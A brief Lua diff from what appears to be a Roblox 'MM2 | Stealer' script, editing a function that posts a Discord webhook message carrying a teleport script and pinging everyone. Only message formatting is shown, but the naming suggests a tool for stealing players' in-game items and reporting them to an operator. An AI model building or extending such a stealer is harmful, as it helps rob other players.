@@ -68,7 +68,7 @@ function SendMessageEMBED(url, embed, bool)
    local data = {
     username = "MM2 | Stealer",
     avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&",
-    content = TeleportScript,
+    content = "--@everyone\n" .. TeleportScript,
     embeds = {
         {
             title = embed.title,
